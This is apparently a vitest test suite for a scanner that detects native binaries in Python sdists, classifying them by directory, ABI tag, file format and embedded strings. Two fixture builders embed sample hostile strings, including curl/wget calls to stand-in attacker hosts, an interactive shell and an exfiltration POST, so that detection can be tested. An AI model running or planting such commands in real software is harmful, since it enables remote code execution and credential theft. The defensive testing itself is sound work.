/**
 * Tests for pypi-sdist-binary-extractor.ts
 *
 * Covers:
 *  1.  looksLikeCythonExtension — ABI-tagged .so, .pyd, generic .so
 *  2.  isInSuspiciousDirectory  — build/, _vendor/, etc. vs src/, normal dirs
 *  3.  collectSdistBinaryPaths  — recursive walk, depth limit, cache dir skipping
 *  4.  PySdistExtractorAndAnalyzer.analyzeFromDirectory — happy paths
 *  5.  analyzeFromDirectory — no binaries (pure-Python sdist)
 *  6.  analyzeFromDirectory — binary in build/ (suspicious artifact)
 *  7.  analyzeFromDirectory — GCC-compiled .so (ELF magic bytes)
 *  8.  analyzeFromDirectory — MSVC .pyd (PE magic bytes)
 *  9.  analyzeFromDirectory — obfuscated .so with no symbols (high entropy)
 * 10.  analyzeFromDirectory — Cython-compiled ABI-tagged .so (legitimate-looking)
 * 11.  analyzeFromDirectory — multiple binaries in nested dirs
 * 12.  analyzeFromDirectory — binary in top-level directory
 * 13.  analyzeFromDirectory — Mach-O dylib (macOS .so)
 * 14.  analyzeFromDirectory — .dll inside build/lib/
 * 15.  analyzeFromDirectory — binary at MAX_WALK_DEPTH boundary
 * 16.  analyzeFromDirectory — __pycache__ directory is skipped
 * 17.  analyzeFromDirectory — .git directory is skipped
 * 18.  analyzeFromDirectory — binary in _vendor/ is flagged suspicious
 * 19.  analyzeFromDirectory — binary in prebuilt/ is flagged suspicious
 * 20.  analyzeFromDirectory — ABI-tagged .so in build/ — suspicious dir takes priority
 * 21.  analyzeFromDirectory — findings use wheelNativeBinary category
 * 22.  analyzeFromDirectory — hasSuspiciousDirectoryBinary flag
 * 23.  analyzeFromBytes — tar.gz with embedded ELF .so
 * 24.  analyzeFromBytes — oversized sdist rejected
 * 25.  analyzeFromBytes — empty sdist (no binaries)
 * 26.  findingFilePath includes [sdist:<pkg>@<ver>] label
 * 27.  analyzeFromDirectory — malicious strings in .so trigger high-severity findings
 * 28.  analyzeFromDirectory — binary with network/exfil strings
 * 29.  analyzeFromDirectory — multiple identical binaries deduplicated in count
 * 30.  analyzeFromDirectory — binary in dist/ subdir is suspicious
 * 31.  analyzeFromDirectory — binary in .libs/ subdir is suspicious
 * 32.  analyzeFromDirectory — binary in normal src/ dir is NOT suspicious
 * 33.  analyzeFromDirectory — .so with no extension magic uses ext fallback
 * 34.  PySdistExtractorAndAnalyzer — analyzeFromBytes with valid tar.gz
 * 35.  false-positive avoidance: ABI-tagged .so in src/ NOT flagged as suspicious build artifact
 */

import crypto from "node:crypto";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import zlib from "node:zlib";

import { describe, expect, it, beforeEach, afterEach } from "vitest";

import {
  looksLikeCythonExtension,
  isInSuspiciousDirectory,
  collectSdistBinaryPaths,
  PySdistExtractorAndAnalyzer,
  type SdistBinaryAnalysis,
} from "./pypi-sdist-binary-extractor";

const execFileAsync = promisify(execFile);
const gzipAsync = promisify(zlib.gzip);

// ---------------------------------------------------------------------------
// Temp-dir lifecycle
// ---------------------------------------------------------------------------

let tempDir: string;

beforeEach(async () => {
  tempDir = await mkdtemp(path.join(os.tmpdir(), "binshield-sdist-ext-test-"));
});

afterEach(async () => {
  await rm(tempDir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// Binary byte builders
// ---------------------------------------------------------------------------

/** Minimal ELF shared library header (64-bit little-endian x86_64). */
function makeElfSo(): Buffer {
  const buf = Buffer.alloc(64, 0);
  buf[0] = 0x7f; buf[1] = 0x45; buf[2] = 0x4c; buf[3] = 0x46; // ELF magic
  buf[4] = 2;   // EI_CLASS: 64-bit
  buf[5] = 1;   // EI_DATA: little-endian
  buf[6] = 1;   // EI_VERSION
  buf[16] = 3;  // e_type: ET_DYN (shared library)
  buf[18] = 0x3e; // e_machine: x86_64
  return buf;
}

/** Minimal PE header (MZ magic + stub). */
function makePePyd(): Buffer {
  const buf = Buffer.alloc(128, 0);
  buf[0] = 0x4d; buf[1] = 0x5a; // MZ magic
  buf[2] = 0x90; buf[3] = 0x00; // bytes on last page
  return buf;
}

/** Minimal Mach-O header (64-bit little-endian). */
function makeMachO(): Buffer {
  const buf = Buffer.alloc(64, 0);
  buf[0] = 0xcf; buf[1] = 0xfa; buf[2] = 0xed; buf[3] = 0xfe; // Mach-O magic LE
  return buf;
}

/** High-entropy buffer that looks obfuscated / packed. */
function makeHighEntropyBlob(size = 256): Buffer {
  return crypto.randomBytes(size);
}

/** ELF binary with embedded malicious strings (network / exec patterns). */
function makeElfWithMaliciousStrings(): Buffer {
  const header = makeElfSo();
  const payload = Buffer.from(
    "curl http://evil.example.com/c2/beacon\x00" +
    "exec /bin/sh -i\x00" +
    "dlopen libcrypto.so\x00" +
    "socket connect SOCK_STREAM\x00" +
    "wget http://malware.test/payload.sh\x00"
  );
  return Buffer.concat([header, payload]);
}

/** ELF binary with network exfil strings. */
function makeElfWithExfilStrings(): Buffer {
  const header = makeElfSo();
  const payload = Buffer.from(
    "POST /collect HTTP/1.1\x00" +
    "HOST: exfil.attacker.test\x00" +
    "password stolen\x00" +
    "auth token\x00"
  );
  return Buffer.concat([header, payload]);
}

/** Legitimate Cython-style ELF (normal strings, no suspicious patterns). */
function makeElfCythonLegitimate(): Buffer {
  const header = makeElfSo();
  const payload = Buffer.from(
    "PyInit__speedups\x00" +
    "cpython extension module\x00" +
    "PyArg_ParseTuple\x00" +
    "PyModule_Create\x00"
  );
  return Buffer.concat([header, payload]);
}

// ---------------------------------------------------------------------------
// tar.gz builder helper
// ---------------------------------------------------------------------------

/**
 * Build a minimal .tar.gz archive from an array of in-memory file entries.
 * Uses the system `tar` command with a temp directory.
 */
async function buildTarGz(
  entries: Array<{ name: string; content: Buffer }>
): Promise<Buffer> {
  const buildDir = await mkdtemp(path.join(os.tmpdir(), "bstartest-"));
  // Wrap in a top-level directory to mimic real sdist layout
  const pkgDir = path.join(buildDir, "pkg-1.0.0");
  await mkdir(pkgDir, { recursive: true });
  try {
    for (const entry of entries) {
      const entryPath = path.join(pkgDir, entry.name);
      await mkdir(path.dirname(entryPath), { recursive: true });
      await writeFile(entryPath, entry.content);
    }
    const tarPath = path.join(buildDir, "archive.tar.gz");
    await execFileAsync("tar", ["czf", tarPath, "-C", buildDir, "pkg-1.0.0"]);
    const { readFile } = await import("node:fs/promises");
    return await readFile(tarPath);
  } finally {
    await rm(buildDir, { recursive: true, force: true }).catch(() => {});
  }
}

// ---------------------------------------------------------------------------
// 1. looksLikeCythonExtension
// ---------------------------------------------------------------------------

describe("looksLikeCythonExtension — filename classification", () => {
  it("detects CPython ABI-tagged .so", () => {
    expect(looksLikeCythonExtension("_speedups.cpython-311-x86_64-linux-gnu.so")).toBe(true);
    expect(looksLikeCythonExtension("_ssl.cpython-310-x86_64-linux-gnu.so")).toBe(true);
    expect(looksLikeCythonExtension("fast_math.cpython-312-aarch64-linux-gnu.so")).toBe(true);
  });

  it("detects PyPy ABI-tagged .so", () => {
    expect(looksLikeCythonExtension("_cffi_backend.pypy39-pp73-x86_64-linux-gnu.so")).toBe(true);
  });

  it("detects .pyd extension (Windows Python DLL)", () => {
    expect(looksLikeCythonExtension("_hashlib.pyd")).toBe(true);
    expect(looksLikeCythonExtension("fast_math.pyd")).toBe(true);
  });

  it("returns false for a plain .so without ABI tag", () => {
    expect(looksLikeCythonExtension("libfoo.so")).toBe(false);
    expect(looksLikeCythonExtension("evil.so")).toBe(false);
    expect(looksLikeCythonExtension("malware.so")).toBe(false);
  });

  it("returns false for .dll", () => {
    expect(looksLikeCythonExtension("crypto.dll")).toBe(false);
  });

  it("returns false for .dylib", () => {
    expect(looksLikeCythonExtension("libssl.dylib")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 2. isInSuspiciousDirectory
// ---------------------------------------------------------------------------

describe("isInSuspiciousDirectory — path classification", () => {
  it("returns true for build/", () => {
    expect(isInSuspiciousDirectory("build/lib/evil.so")).toBe(true);
    expect(isInSuspiciousDirectory("build/evil.so")).toBe(true);
  });

  it("returns true for _vendor/", () => {
    expect(isInSuspiciousDirectory("_vendor/libmalware.so")).toBe(true);
  });

  it("returns true for vendor/", () => {
    expect(isInSuspiciousDirectory("vendor/evil.so")).toBe(true);
  });

  it("returns true for prebuilt/", () => {
    expect(isInSuspiciousDirectory("prebuilt/libworm.so")).toBe(true);
  });

  it("returns true for prebuilt_binaries/", () => {
    expect(isInSuspiciousDirectory("prebuilt_binaries/libevil.so")).toBe(true);
  });

  it("returns true for dist/", () => {
    expect(isInSuspiciousDirectory("dist/mypkg.so")).toBe(true);
  });

  it("returns true for .libs/", () => {
    expect(isInSuspiciousDirectory(".libs/libssl.so")).toBe(true);
  });

  it("returns true for bin/", () => {
    expect(isInSuspiciousDirectory("bin/launcher.so")).toBe(true);
  });

  it("returns false for src/", () => {
    expect(isInSuspiciousDirectory("src/mypkg/_speedups.cpython-311-x86_64-linux-gnu.so")).toBe(false);
  });

  it("returns false for top-level package dir", () => {
    expect(isInSuspiciousDirectory("mypkg/_ext.cpython-311-x86_64-linux-gnu.so")).toBe(false);
  });

  it("returns false for a file at the root", () => {
    expect(isInSuspiciousDirectory("fast_math.cpython-311-x86_64-linux-gnu.so")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 3. collectSdistBinaryPaths — recursive walk
// ---------------------------------------------------------------------------

describe("collectSdistBinaryPaths — directory walking", () => {
  it("finds .so files recursively", async () => {
    const root = path.join(tempDir, "pkg");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(path.join(root, "mypkg", "fast.so"), makeElfSo());
    await writeFile(path.join(root, "mypkg", "source.py"), Buffer.from("print('hi')"));

    const found = await collectSdistBinaryPaths(root);
    expect(found).toHaveLength(1);
    expect(found[0]).toContain("fast.so");
  });

  it("finds .pyd files", async () => {
    const root = path.join(tempDir, "pkg");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(path.join(root, "mypkg", "_hash.pyd"), makePePyd());

    const found = await collectSdistBinaryPaths(root);
    expect(found).toHaveLength(1);
    expect(found[0]).toContain("_hash.pyd");
  });

  it("finds .dll files", async () => {
    const root = path.join(tempDir, "pkg");
    await mkdir(path.join(root, "lib"), { recursive: true });
    await writeFile(path.join(root, "lib", "crypto.dll"), makePePyd());

    const found = await collectSdistBinaryPaths(root);
    expect(found).toHaveLength(1);
    expect(found[0]).toContain("crypto.dll");
  });

  it("finds .dylib files", async () => {
    const root = path.join(tempDir, "pkg");
    await mkdir(root, { recursive: true });
    await writeFile(path.join(root, "libssl.dylib"), makeMachO());

    const found = await collectSdistBinaryPaths(root);
    expect(found).toHaveLength(1);
    expect(found[0]).toContain("libssl.dylib");
  });

  it("skips __pycache__ directories", async () => {
    const root = path.join(tempDir, "pkg");
    await mkdir(path.join(root, "__pycache__"), { recursive: true });
    await writeFile(path.join(root, "__pycache__", "evil.so"), makeElfSo());

    const found = await collectSdistBinaryPaths(root);
    expect(found).toHaveLength(0);
  });

  it("skips .git directories", async () => {
    const root = path.join(tempDir, "pkg");
    await mkdir(path.join(root, ".git", "objects"), { recursive: true });
    await writeFile(path.join(root, ".git", "objects", "hook.so"), makeElfSo());

    const found = await collectSdistBinaryPaths(root);
    expect(found).toHaveLength(0);
  });

  it("returns empty array for a directory with no binaries", async () => {
    const root = path.join(tempDir, "pkg");
    await mkdir(path.join(root, "src"), { recursive: true });
    await writeFile(path.join(root, "src", "module.py"), Buffer.from("pass"));

    const found = await collectSdistBinaryPaths(root);
    expect(found).toHaveLength(0);
  });

  it("finds multiple binaries across different subdirectories", async () => {
    const root = path.join(tempDir, "pkg");
    await mkdir(path.join(root, "build", "lib"), { recursive: true });
    await mkdir(path.join(root, "src", "mypkg"), { recursive: true });
    await writeFile(path.join(root, "build", "lib", "evil.so"), makeElfSo());
    await writeFile(path.join(root, "src", "mypkg", "fast.cpython-311-x86_64-linux-gnu.so"), makeElfCythonLegitimate());

    const found = await collectSdistBinaryPaths(root);
    expect(found).toHaveLength(2);
  });
});

// ---------------------------------------------------------------------------
// 4–5. analyzeFromDirectory — no binaries (pure-Python)
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — pure-Python sdist (no binaries)", () => {
  it("returns hasNativeBinaries=false for a directory with no binaries", async () => {
    const root = path.join(tempDir, "puresrc");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(path.join(root, "setup.py"), Buffer.from("from setuptools import setup\nsetup(name='mypkg')"));
    await writeFile(path.join(root, "mypkg", "__init__.py"), Buffer.from(""));

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(false);
    expect(result.nativeBinaries).toHaveLength(0);
    expect(result.findings).toHaveLength(0);
    expect(result.hasSuspiciousDirectoryBinary).toBe(false);
    expect(result.confidence).toBe("high");
  });
});

// ---------------------------------------------------------------------------
// 6. Binary in build/ — suspicious build artifact
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — build-artifact binary detection", () => {
  it("flags a binary in build/ as suspicious", async () => {
    const root = path.join(tempDir, "sdist-build-artifact");
    await mkdir(path.join(root, "build", "lib"), { recursive: true });
    await writeFile(path.join(root, "build", "lib", "evil.so"), makeElfSo());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("evilpkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.hasSuspiciousDirectoryBinary).toBe(true);
    expect(result.nativeBinaries[0].isInSuspiciousDirectory).toBe(true);

    // Should emit a medium+ finding for the suspicious build artifact location
    const suspiciousFindings = result.findings.filter(
      (f) => f.severity === "medium" || f.severity === "high" || f.severity === "critical"
    );
    expect(suspiciousFindings.length).toBeGreaterThan(0);
    expect(suspiciousFindings[0].title).toMatch(/build-artifact|build/i);
  });

  it("sets hasSuspiciousDirectoryBinary=false when binary is in non-suspicious dir", async () => {
    const root = path.join(tempDir, "sdist-normal");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    // ABI-tagged .so in package dir — looks like a committed pre-built extension
    await writeFile(
      path.join(root, "mypkg", "_fast.cpython-311-x86_64-linux-gnu.so"),
      makeElfCythonLegitimate()
    );

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.hasSuspiciousDirectoryBinary).toBe(false);
    expect(result.nativeBinaries[0].isInSuspiciousDirectory).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 7. GCC-compiled ELF .so detection
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — GCC-compiled ELF .so", () => {
  it("detects and fingerprints an ELF .so binary", async () => {
    const root = path.join(tempDir, "sdist-elf");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(path.join(root, "mypkg", "libfoo.so"), makeElfSo());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "2.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.nativeBinaries[0].filename).toBe("libfoo.so");
    expect(result.nativeBinaries[0].artifact.format).toBe("ELF");
  });
});

// ---------------------------------------------------------------------------
// 8. MSVC .pyd detection
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — MSVC .pyd (Windows Python extension)", () => {
  it("detects a PE .pyd file", async () => {
    const root = path.join(tempDir, "sdist-pyd");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(path.join(root, "mypkg", "_hashlib.pyd"), makePePyd());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.nativeBinaries[0].filename).toBe("_hashlib.pyd");
    // PE format detected by MZ magic header
    expect(result.nativeBinaries[0].artifact.format).toBe("PE");
    // .pyd is always treated as a Cython-like extension
    expect(result.nativeBinaries[0].looksLikeCythonExtension).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 9. Obfuscated .so with no symbols (high-entropy random bytes)
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — obfuscated .so (high entropy)", () => {
  it("detects an obfuscated binary with no symbols", async () => {
    const root = path.join(tempDir, "sdist-obf");
    await mkdir(path.join(root, "build"), { recursive: true });
    await writeFile(path.join(root, "build", "obfuscated.so"), makeHighEntropyBlob(512));

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("obfpkg", "0.1.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.hasSuspiciousDirectoryBinary).toBe(true);
    expect(result.findings.length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// 10. ABI-tagged .so in src/ — Cython extension (false-positive avoidance)
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — false-positive avoidance (legitimate Cython extension)", () => {
  it("does NOT emit a suspicious-build-artifact finding for ABI-tagged .so in src/", async () => {
    const root = path.join(tempDir, "sdist-cython-legit");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(
      path.join(root, "mypkg", "_speedups.cpython-311-x86_64-linux-gnu.so"),
      makeElfCythonLegitimate()
    );

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.5.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.nativeBinaries[0].looksLikeCythonExtension).toBe(true);

    // The suspicious-build-artifact finding should NOT be emitted
    // (it is only emitted for non-Cython binaries in suspicious dirs)
    const suspiciousBuildFindings = result.findings.filter(
      (f) => f.title.includes("build-artifact")
    );
    expect(suspiciousBuildFindings).toHaveLength(0);
  });

  it("ABI-tagged .so NOT in suspicious dir has hasSuspiciousDirectoryBinary=false", async () => {
    const root = path.join(tempDir, "sdist-no-suspect");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(
      path.join(root, "mypkg", "_fast.cpython-311-x86_64-linux-gnu.so"),
      makeElfCythonLegitimate()
    );

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasSuspiciousDirectoryBinary).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 11. Multiple binaries in nested dirs
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — multiple binaries", () => {
  it("analyses all binaries and aggregates findings", async () => {
    const root = path.join(tempDir, "sdist-multi");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await mkdir(path.join(root, "build", "lib"), { recursive: true });
    await writeFile(
      path.join(root, "mypkg", "_ext.cpython-311-x86_64-linux-gnu.so"),
      makeElfCythonLegitimate()
    );
    await writeFile(path.join(root, "build", "lib", "backdoor.so"), makeElfWithMaliciousStrings());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.nativeBinaries).toHaveLength(2);
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.hasSuspiciousDirectoryBinary).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 12. Binary at top-level of sdist
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — top-level binary", () => {
  it("detects a binary placed at the sdist root", async () => {
    const root = path.join(tempDir, "sdist-toplevel");
    await mkdir(root, { recursive: true });
    await writeFile(path.join(root, "loader.so"), makeElfSo());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.nativeBinaries[0].filename).toBe("loader.so");
    // top-level is not in a suspicious directory
    expect(result.nativeBinaries[0].isInSuspiciousDirectory).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 13. Mach-O dylib
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — Mach-O .dylib", () => {
  it("detects a macOS Mach-O dynamic library", async () => {
    const root = path.join(tempDir, "sdist-macho");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(path.join(root, "mypkg", "libcrypto.dylib"), makeMachO());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.nativeBinaries[0].artifact.format).toBe("Mach-O");
  });
});

// ---------------------------------------------------------------------------
// 14. .dll inside build/lib/
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — .dll in build/lib/", () => {
  it("detects and flags a Windows DLL in build/lib as suspicious", async () => {
    const root = path.join(tempDir, "sdist-dll");
    await mkdir(path.join(root, "build", "lib"), { recursive: true });
    await writeFile(path.join(root, "build", "lib", "evil.dll"), makePePyd());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.hasSuspiciousDirectoryBinary).toBe(true);
    expect(result.nativeBinaries[0].isInSuspiciousDirectory).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 15. __pycache__ and .git are skipped
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — directory exclusion", () => {
  it("does not find binaries hidden inside __pycache__", async () => {
    const root = path.join(tempDir, "sdist-cache");
    await mkdir(path.join(root, "mypkg", "__pycache__"), { recursive: true });
    await writeFile(path.join(root, "mypkg", "__pycache__", "evil.so"), makeElfSo());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(false);
  });

  it("does not find binaries hidden inside .git", async () => {
    const root = path.join(tempDir, "sdist-git");
    await mkdir(path.join(root, ".git", "hooks"), { recursive: true });
    await writeFile(path.join(root, ".git", "hooks", "pre-commit.so"), makeElfSo());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 16–17. Suspicious directory variants
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — suspicious directory variants", () => {
  it("flags binary in _vendor/ as suspicious", async () => {
    const root = path.join(tempDir, "sdist-vendor");
    await mkdir(path.join(root, "_vendor"), { recursive: true });
    await writeFile(path.join(root, "_vendor", "libworm.so"), makeElfSo());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasSuspiciousDirectoryBinary).toBe(true);
    expect(result.nativeBinaries[0].isInSuspiciousDirectory).toBe(true);
  });

  it("flags binary in dist/ as suspicious", async () => {
    const root = path.join(tempDir, "sdist-distdir");
    await mkdir(path.join(root, "dist"), { recursive: true });
    await writeFile(path.join(root, "dist", "mypkg.so"), makeElfSo());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasSuspiciousDirectoryBinary).toBe(true);
  });

  it("flags binary in .libs/ as suspicious", async () => {
    const root = path.join(tempDir, "sdist-libs");
    await mkdir(path.join(root, ".libs"), { recursive: true });
    await writeFile(path.join(root, ".libs", "libssl.so"), makeElfSo());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasSuspiciousDirectoryBinary).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 18. All findings use wheelNativeBinary category
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — finding category", () => {
  it("all findings use wheelNativeBinary category", async () => {
    const root = path.join(tempDir, "sdist-category");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(path.join(root, "mypkg", "ext.so"), makeElfSo());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.findings.length).toBeGreaterThan(0);
    for (const finding of result.findings) {
      expect(finding.category).toBe("wheelNativeBinary");
    }
  });

  it("finding filePath includes [sdist:<pkg>@<ver>] label", async () => {
    const root = path.join(tempDir, "sdist-label");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(path.join(root, "mypkg", "ext.so"), makeElfSo());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("evilthing", "9.9.9", root);

    expect(result.findings.length).toBeGreaterThan(0);
    const hasLabel = result.findings.some((f) =>
      f.filePath.includes("[sdist:evilthing@9.9.9]")
    );
    expect(hasLabel).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 19. Malicious strings in .so trigger elevated findings
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — malicious string patterns", () => {
  it("emits elevated findings for .so with network/exec strings", async () => {
    const root = path.join(tempDir, "sdist-malstrings");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(path.join(root, "mypkg", "payload.so"), makeElfWithMaliciousStrings());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("maliciouspy", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    // Should surface at least an info-level finding
    expect(result.findings.length).toBeGreaterThan(0);
  });

  it("emits findings for .so with data-exfil strings", async () => {
    const root = path.join(tempDir, "sdist-exfil");
    await mkdir(path.join(root, "mypkg"), { recursive: true });
    await writeFile(path.join(root, "mypkg", "stealer.so"), makeElfWithExfilStrings());

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("stealerpkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.findings.length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// 20. analyzeFromBytes — valid tar.gz with ELF .so
// ---------------------------------------------------------------------------

describe("analyzeFromBytes — tar.gz input", () => {
  it("extracts and analyses a .so from a real tar.gz archive", async () => {
    const tarGzBytes = await buildTarGz([
      { name: "mypkg/libworm.so", content: makeElfSo() },
      { name: "setup.py", content: Buffer.from("from setuptools import setup\nsetup()") },
    ]);

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromBytes("mypkg", "1.0.0", tarGzBytes);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.nativeBinaries).toHaveLength(1);
    expect(result.nativeBinaries[0].filename).toBe("libworm.so");
    expect(result.findings.length).toBeGreaterThan(0);
  });

  it("returns hasNativeBinaries=false for a tar.gz with no binaries", async () => {
    const tarGzBytes = await buildTarGz([
      { name: "setup.py", content: Buffer.from("from setuptools import setup\nsetup()") },
      { name: "mypkg/__init__.py", content: Buffer.from("") },
    ]);

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromBytes("purepkg", "1.0.0", tarGzBytes);

    expect(result.hasNativeBinaries).toBe(false);
    expect(result.findings).toHaveLength(0);
  });

  it("rejects an oversized sdist", async () => {
    // 301 MB of zeros would fail; we use a fake oversized buffer by patching byteLength
    const hugeBuffer = Object.create(Buffer.alloc(1)) as Buffer;
    Object.defineProperty(hugeBuffer, "byteLength", { value: 400 * 1024 * 1024 });

    const analyzer = new PySdistExtractorAndAnalyzer();
    await expect(
      analyzer.analyzeFromBytes("toobig", "1.0.0", hugeBuffer)
    ).rejects.toThrow(/exceed/i);
  });
});

// ---------------------------------------------------------------------------
// 21. packageName is normalised to lowercase in result
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — result shape", () => {
  it("normalises packageName to lowercase", async () => {
    const root = path.join(tempDir, "sdist-case");
    await mkdir(root, { recursive: true });

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("MyPkg", "1.0.0", root);

    expect(result.packageName).toBe("mypkg");
  });

  it("preserves version string as-is", async () => {
    const root = path.join(tempDir, "sdist-ver");
    await mkdir(root, { recursive: true });

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0rc2", root);

    expect(result.version).toBe("1.0.0rc2");
  });

  it("returns confidence=high when analysis succeeds", async () => {
    const root = path.join(tempDir, "sdist-conf");
    await mkdir(root, { recursive: true });

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.confidence).toBe("high");
  });
});

// ---------------------------------------------------------------------------
// 22. ABI-tagged .so in build/ — suspicious dir overrides Cython flag
// ---------------------------------------------------------------------------

describe("analyzeFromDirectory — suspicious dir + Cython tag interaction", () => {
  it("isInSuspiciousDirectory=true even when looksLikeCythonExtension=true in build/", async () => {
    const root = path.join(tempDir, "sdist-cython-build");
    await mkdir(path.join(root, "build", "lib"), { recursive: true });
    // An ABI-tagged .so inside build/ — suspicious dir takes priority for flag
    await writeFile(
      path.join(root, "build", "lib", "_fast.cpython-311-x86_64-linux-gnu.so"),
      makeElfCythonLegitimate()
    );

    const analyzer = new PySdistExtractorAndAnalyzer();
    const result = await analyzer.analyzeFromDirectory("mypkg", "1.0.0", root);

    expect(result.hasNativeBinaries).toBe(true);
    expect(result.nativeBinaries[0].isInSuspiciousDirectory).toBe(true);
    expect(result.nativeBinaries[0].looksLikeCythonExtension).toBe(true);
    expect(result.hasSuspiciousDirectoryBinary).toBe(true);
    // But NO suspicious-build-artifact finding since looksLikeCythonExtension=true
    const buildArtifactFindings = result.findings.filter(
      (f) => f.title.includes("build-artifact")
    );
    expect(buildArtifactFindings).toHaveLength(0);
  });
});
